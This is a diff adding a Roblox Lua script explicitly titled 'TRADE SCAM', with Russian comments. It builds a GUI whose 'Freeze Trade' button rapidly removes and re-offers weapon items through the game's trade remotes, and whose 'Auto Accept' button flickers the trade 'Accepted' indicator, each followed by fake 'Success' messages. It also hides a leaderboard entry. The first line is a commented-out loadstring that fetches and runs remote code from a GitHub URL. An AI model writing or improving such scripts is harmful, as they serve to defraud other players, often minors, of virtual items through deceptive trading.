@@ -1,0 +1,257 @@
+---  loadstring(game:HttpGet("https://raw.githubusercontent.com/LingerDark/mmgui/refs/heads/main/trade4"))()
+
+game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.PlayerList.RanoDevx.Visible = false
+
+local ScreenGUI = Instance.new("ScreenGui")
+ScreenGUI.Name = "TradeScamGUI"
+ScreenGUI.IgnoreGuiInset = true
+ScreenGUI.DisplayOrder = 9999
+ScreenGUI.ResetOnSpawn = false
+ScreenGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local BackgroundFrame = Instance.new("Frame")
+BackgroundFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
+BackgroundFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
+BackgroundFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+BackgroundFrame.BorderSizePixel = 0
+BackgroundFrame.Active = true -- Сделаем фрейм активным для взаимодействий
+BackgroundFrame.Parent = ScreenGUI
+
+local Title = Instance.new("TextLabel")
+Title.Parent = BackgroundFrame
+Title.Text = "TRADE SCAM | Tieroblox"
+Title.Size = UDim2.new(1, 0, 0.15, 0)
+Title.TextSize = 25
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.FredokaOne
+
+local UsernameTextBox = Instance.new("TextBox")
+UsernameTextBox.Parent = BackgroundFrame
+UsernameTextBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+UsernameTextBox.Text = "Username"
+UsernameTextBox.PlaceholderText = "" -- Оставляем пустым
+UsernameTextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
+UsernameTextBox.TextSize = 18
+UsernameTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+UsernameTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+UsernameTextBox.Font = Enum.Font.FredokaOne
+UsernameTextBox.ClearTextOnFocus = true
+
+local FreezeTradeCheck = Instance.new("TextButton")
+FreezeTradeCheck.Parent = BackgroundFrame
+FreezeTradeCheck.Text = "Frezze Trade"
+FreezeTradeCheck.Size = UDim2.new(0.8, 0, 0.15, 0)
+FreezeTradeCheck.Position = UDim2.new(0.1, 0, 0.4, 0)
+FreezeTradeCheck.TextSize = 18
+FreezeTradeCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+FreezeTradeCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+FreezeTradeCheck.Font = Enum.Font.FredokaOne
+
+local AutoAcceptCheck = Instance.new("TextButton")
+AutoAcceptCheck.Parent = BackgroundFrame
+AutoAcceptCheck.Text = "Auto Accept"
+AutoAcceptCheck.Size = UDim2.new(0.8, 0, 0.15, 0)
+AutoAcceptCheck.Position = UDim2.new(0.1, 0, 0.6, 0)
+AutoAcceptCheck.TextSize = 18
+AutoAcceptCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoAcceptCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+AutoAcceptCheck.Font = Enum.Font.FredokaOne
+
+-- Функционал кнопок (смена цвета при нажатии)
+local function toggleButton(button)
+    if button.BackgroundColor3 == Color3.fromRGB(50, 50, 50) then
+        button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    else
+        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end
+
+FreezeTradeCheck.MouseButton1Click:Connect(function()
+    toggleButton(FreezeTradeCheck)
+    
+    if FreezeTradeCheck.BackgroundColor3 == Color3.fromRGB(0, 200, 0) then
+        game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.PlayerList.RanoDevx.Visible = false
+        print("Freeze Trade Включен")
+        --- Убираем и добавляем
+        FreezeTradeCheck.Text = "Proccess"
+        task.wait(1)
+        FreezeTradeCheck.Text = "Get Trade Weapons"
+        task.wait(0.4)
+        FreezeTradeCheck.Text = "Success"
+        local args = {
+            [1] = "Harvester",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.3)
+        local args = {
+            [1] = "Harvester",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "Harvester",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "Harvester",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.4)
+        local args = {
+            [1] = "Harvester",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.1)
+        FreezeTradeCheck.Text = "Harvester"
+        --- Убираем и добавляем
+        local args = {
+            [1] = "Icepiercer",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.3)
+        local args = {
+            [1] = "Icepiercer",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "Icepiercer",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "Icepiercer",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.4)
+        local args = {
+            [1] = "Icepiercer",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.1)
+        FreezeTradeCheck.Text = "Icepiercer"
+        --- Убираем и добавляем
+        local args = {
+            [1] = "ZombieBat",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.3)
+        local args = {
+            [1] = "ZombieBat",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "ZombieBat",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.2)
+        local args = {
+            [1] = "ZombieBat",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        task.wait(0.4)
+        local args = {
+            [1] = "ZombieBat",
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("RemoveOffer"):FireServer(unpack(args))
+        task.wait(0.3)
+        FreezeTradeCheck.Text = "Bat"
+        task.wait(2)
+        FreezeTradeCheck.Text = "Success! Enable Auto-Accept"
+        task.wait(4)
+        FreezeTradeCheck.Text = "Frezze Trade"
+        FreezeTradeCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.PlayerList.RanoDevx.Visible = false
+    else
+        print("Freeze Trade Выключен")
+    end
+end)
+
+AutoAcceptCheck.MouseButton1Click:Connect(function()
+    toggleButton(AutoAcceptCheck)
+    
+    if AutoAcceptCheck.BackgroundColor3 == Color3.fromRGB(0, 200, 0) then
+        AutoAcceptCheck.Text = "Proccess"
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = true
+        task.wait(0.3)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = false
+        task.wait(0.2)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = true
+        task.wait(0.25)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = false
+        task.wait(0.2)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = true
+        task.wait(0.15)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = false
+        task.wait(0.2)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = true
+        task.wait(0.15)
+        game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.YourOffer.Accepted.Visible = false
+        task.wait(0.15)
+        AutoAcceptCheck.Text = "Success! Accept Trade"
+        task.wait(4)
+        AutoAcceptCheck.Text = "Auto Accept"
+        AutoAcceptCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    else
+        print("Auto Accept Выключен")
+    end
+end)
+
+
+-- Перетаскивание UI
+local isDragging = false
+local dragInput, dragStart, startPos
+
+BackgroundFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = true
+        dragStart = input.Position
+        startPos = BackgroundFrame.Position
+    end
+end)
+
+BackgroundFrame.InputChanged:Connect(function(input)
+    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        BackgroundFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+BackgroundFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = false
+    end
+end)
